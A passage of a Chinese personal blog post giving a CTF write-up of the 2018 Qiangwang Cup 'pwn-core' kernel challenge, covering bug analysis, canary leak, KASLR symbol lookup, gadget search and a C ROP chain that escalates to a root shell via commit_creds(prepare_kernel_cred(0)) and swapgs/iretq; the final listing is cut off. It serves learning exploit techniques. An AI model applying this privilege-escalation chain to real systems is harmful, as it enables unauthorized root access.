<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>关于 kernel-ROP &amp; ret2user &amp; bypass-SMEP 的学习总结 | ZIKH26's Blog</title><meta name="keywords" content="kernel-ROP,kernel"><meta name="author" content="ZIKH26"><meta name="copyright" content="ZIKH26"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="内核态的 ROP 和用户态的思路和做法是一样的，都是利用 gadget 来不断控制执行流，进行任意的函数调用。不过获取基地址还有搜索 gadget 等一些小细节发生了变化，但思想不变，所以理解起来应该还是很快的 kernel-ROP 例题是 2018强网杯 pwn-core 代码分析 发现 ioctl 函数中可以控制 off 这个全局变量（如下）  core_read 函数，存在数组索引溢出的漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="关于 kernel-ROP &amp; ret2user &amp; bypass-SMEP 的学习总结">
<meta property="og:url" content="https://zikh26.github.io/posts/a31a5755.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="内核态的 ROP 和用户态的思路和做法是一样的，都是利用 gadget 来不断控制执行流，进行任意的函数调用。不过获取基地址还有搜索 gadget 等一些小细节发生了变化，但思想不变，所以理解起来应该还是很快的 kernel-ROP 例题是 2018强网杯 pwn-core 代码分析 发现 ioctl 函数中可以控制 off 这个全局变量（如下）  core_read 函数，存在数组索引溢出的漏洞">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zikh26.github.io/img/14.jpg">
<meta property="article:published_time" content="2023-05-23T09:22:04.468Z">
<meta property="article:modified_time" content="2023-05-23T09:22:04.468Z">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="kernel-ROP">
<meta property="article:tag" content="kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zikh26.github.io/img/14.jpg"><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="https://zikh26.github.io/posts/a31a5755"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '关于 kernel-ROP & ret2user & bypass-SMEP 的学习总结',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-23 17:22:04'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">98</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/14.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ZIKH26's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于 kernel-ROP &amp; ret2user &amp; bypass-SMEP 的学习总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-23T09:22:04.468Z" title="发表于 2023-05-23 17:22:04">2023-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-23T09:22:04.468Z" title="更新于 2023-05-23 17:22:04">2023-05-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">学习总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/a31a5755.html" data-flag-title="关于 kernel-ROP &amp; ret2user &amp; bypass-SMEP 的学习总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>内核态的 <code>ROP</code> 和用户态的思路和做法是一样的，都是利用 <code>gadget</code> 来不断控制执行流，进行任意的函数调用。不过获取基地址还有搜索 <code>gadget</code> 等一些小细节发生了变化，但思想不变，所以理解起来应该还是很快的</p>
<h2 id="kernel-ROP">kernel-ROP</h2>
<p>例题是 <a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%20%E5%BC%BA%E7%BD%91%E6%9D%AFkernel%20pwn-core">2018强网杯 pwn-core</a></p>
<h3 id="代码分析">代码分析</h3>
<p>发现 <code>ioctl</code> 函数中可以控制 <code>off</code> 这个全局变量（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051126597.png" alt="image-20230405112654518" style="zoom:50%;" />
<p><code>core_read</code> 函数，存在数组索引溢出的漏洞， <code>off</code> 我们可控，且程序没有做任何检查，<code>v5</code> 是在栈中，因此配合 <code>copy_to_user</code> 函数可以泄露栈中的任意数据，这里考虑来泄露 <code>canary</code> 以便后面的 <code>rop</code> 执行。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051128320.png" alt="image-20230405112810250" style="zoom:50%;" />
<p>通过分析 <code>off</code> 为 <code>0x40</code> 的时候<code>&amp;v5[off]</code> 正好指向了 <code>canary</code> 的位置（这里就是 <code>PWN</code> 手的基本技能，所以不再赘述），<code>copy_to_user</code> 会将内核中的数据 <code>copy</code> 到用户空间中，也就是赋值给了 <code>a1</code> 。</p>
<p><code>core_copy_func</code> 函数中存在一个强转的漏洞（如下），将 <code>__int64</code> 类型的 <code>a1</code> ，强转为了 <code>unsigned __int16</code> 类型，如果我们将 <code>a1</code> 设置为 <code>0xffffffffffff0000 | (0xd0)</code> ，就可以在绕过 <code>if(a1 &gt; 63)</code> 检查的情况下执行 <code>qmemcpy</code> 函数完成栈溢出</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081646889.png" alt="image-20230408164606742" style="zoom:50%;" />
<p>不过上面这里只是能控制 <code>a1</code> 这个字节数，想要 <code>ROP</code> 还需要控制 <code>name</code> 数组中的数据。</p>
<p>通过查看 <code>core_write</code> 函数，发现这里可以直接控制 <code>name</code> 数组中的内容，如此任意读和任意写都有了，就可以开始我们的 <code>kernel-ROP</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081718605.png" alt="image-20230408171831543"></p>
<h3 id="利用过程">利用过程</h3>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081726031.png" alt="image-20230408172611971"></p>
<p>因为程序开了 <code>canary</code> ，所以 <code>ROP</code> 之前需要先进行泄露 <code>canary</code></p>
<h4 id="泄露-canary">泄露 <code>canary</code></h4>
<p>所以泄露 <code>canary</code> 的部分 <code>exp</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">    canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里一定要注意，从内核 <code>copy</code> 过来的数据有 <code>64</code> 个字节，而不是只有 <code>canary</code> ，当时程序就定义了一个 <code>int</code> 类型的变量  <code>canary</code> 传入了地址进行接收，结果直接报错（原因是破坏了用户程序的 <code>canary</code>）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051735283.png" alt="image-20230405173514198"></p>
<h4 id="获取函数的真实地址">获取函数的真实地址</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>从 <code>/proc/kallsyms</code> 文件中可以获取任意一个函数的真实地址，本题的 <code>init</code> 文件中将 <code>/proc/kallsyms</code> 文件 <code>copy</code> 了一份叫做 <code>/tmp/kallsyms</code> ，读取该文件，即可得到函数的真实地址，但如果想获取 <code>vmlinux</code> 中的基地址，我们还需要拿到函数在 <code>vmlinux</code> 中的偏移。</p>
<h5 id="获取vmlinux中的函数偏移">获取vmlinux中的函数偏移</h5>
<p>因为开了 <code>KASLR</code> ，所以函数的真实地址需要获取基地址和函数偏移才行。</p>
<p>使用 <code>readelf -s vmlinux | grep vuln</code> 获取其地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051802154.png" alt="image-20230405180248088"></p>
<p>然后再用 <code>checksec</code> 命令来获取基地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051804686.png" alt="image-20230405180406627"></p>
<p>得到 <code>prepare_kernel_cred</code> 的偏移为 <code>0x9cce0</code>  , <code>commit_creds</code> 函数的偏移为 <code>0x9c8e0</code></p>
<p>把这些偏移写回到上面的脚本即可，之所以要拿到 <code>vmlinux</code> 的基地址是因为后续的 <code>gadget</code> 偏移需要加上基地址才能得到 <code>gadget</code> 的真实地址。</p>
<h4 id="获取-gadget">获取 <code>gadget</code></h4>
<p>如下方法查看 <code>gadget</code> 会比较方便</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">grep &#x27;: pop rdi ; ret&#x27; ropgadget </span><br></pre></td></tr></table></figure>
<p>或者用 <code>vscode</code> 打开 <code>ropgadget</code> 文件， <code>ctrl+f</code> 来搜索也可以</p>
<p>找到的 <code>gadget</code> 需要先减去 <code>vmlinux</code> 的基地址得到 <code>gadget</code> 的偏移</p>
<p>最后在 <code>exp</code> 中，一个 <code>gadget</code> 的真实地址应该是 <code>vmlinux_base</code> 加上其偏移</p>
<h4 id="ROP-链的布置"><code>ROP</code> 链的布置</h4>
<p>我们最后希望用 <code>ROP</code> 来执行 <code>commit_creds(prepare_kernel_cred(0))</code> ，<code>prepare_kernel_cred(0)</code> 会返回一个 <code>root</code> 权限的 <code>cred</code> 结构体指针，而 <code>commit_creds</code> 函数可以将该结构体指针作用于当前进程，接着我们返回用户态，去执行一个 <code>system(&quot;/bin/sh&quot;)</code> 便可以稳定的以 <code>root</code> 权限执行命令了。</p>
<p>正常情况下，我们需要用 <code>pop rdi ; ret</code> 这个 <code>gadget</code> 来控制 <code>prepare_kernel_cred</code> 函数的参数，我们也可以成功搜到这个 <code>gadget</code> ，但问题在于没有 <code>mov rdi,rax ; ret</code> 这个 <code>gadget</code> 来传递给 <code>commit_creds</code> 函数参数，通过搜索发现具有一个 <code>mov rdi, rax ; jmp rdx</code> 这个 <code>gadget</code> ，并且存在 <code>pop rdx ; ret</code> 来控制 <code>rdx</code> ，因此 <code>rop</code> 链的布置如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br></pre></td></tr></table></figure>
<p>此时 <code>commit_creds(prepare_kernel_cred(0))</code> 执行完毕，但需要来稳固程序，因为在内核态栈溢出后，栈中的一些数据被损坏，其中包括了用户态的状态信息，一旦损失了这些信息，重新切换到用户态时系统就会崩溃。所以我们要在攻击之前先保存一下状态信息，将其构造在内核栈中，最后返回的时候就是正常的。</p>
<p>系统权限分为内核态和用户态，分离的实现是 <code>swapgs</code> 指令，该指令将 <code>gs</code> 寄存器的值与 <code>IA32_KERNEL_GS_BASE MSR</code> 地址中的值交换。内核态常规操作（如系统调用）的入口处，执行 <code>swapgs</code> 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 <code>swapgs</code></p>
<p><code>iretq</code> 指令用来恢复用户空间，它会从栈中弹出已经保存的 <code>RIP</code> <code>CS</code> <code>RFLAGS</code> <code>RSP</code> <code>SS</code> 恢复之前的执行环境，所以最后执行 <code>iretq</code> 指令，恢复最开始保存的寄存器值即可。</p>
<p>所以 <code>ROP</code> 链的部分为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x400</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   rop[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++]=canary;</span><br><span class="line">rop[i++]=<span class="number">0xdeadbeefdeadbeef</span>;<span class="comment">//rbp(junk)</span></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xb2f</span>;<span class="comment">//pop rdi ; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++]=prepare_kernel_cred;<span class="comment">//commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa0f49</span>; <span class="comment">//pop rdx ; ret</span></span><br><span class="line">rop[i++]=commit_creds;</span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0x6a6d2</span>; <span class="comment">//mov rdi, rax ; jmp rdx</span></span><br><span class="line"></span><br><span class="line">rop[i++]=vmlinux_base+<span class="number">0xa012da</span>;<span class="comment">//swapgs; popfq; ret</span></span><br><span class="line">rop[i++]=<span class="number">0</span>;</span><br><span class="line">rop[i++] = vmlinux_base + <span class="number">0x50ac2</span>;      <span class="comment">//iretp_ret</span></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)get_shell; <span class="comment">//RIP</span></span><br><span class="line">rop[i++] = user_cs;<span class="comment">//CS</span></span><br><span class="line">rop[i++] = user_rflags;<span class="comment">//rflags</span></span><br><span class="line">rop[i++] = user_sp;<span class="comment">//RSP</span></span><br><span class="line">rop[i++] = user_ss;<span class="comment">//SS</span></span><br></pre></td></tr></table></figure>
<p>下面两张图片是 <code>iretq</code> 指令执行前后的情况，可以看到已经从内核态切换到了用户态（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840059.png" alt="image-20230408183923247"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840996.png" alt="image-20230408183934789"></p>
<p>因为 <code>RIP</code> 设置的是用户态中 <code>system(&quot;/bin/sh&quot;)</code> 的地址，因此开启了新的 <code>root shell</code> （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081843627.png" alt="image-20230408184359505"></p>
<h3 id="EXP">EXP</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span 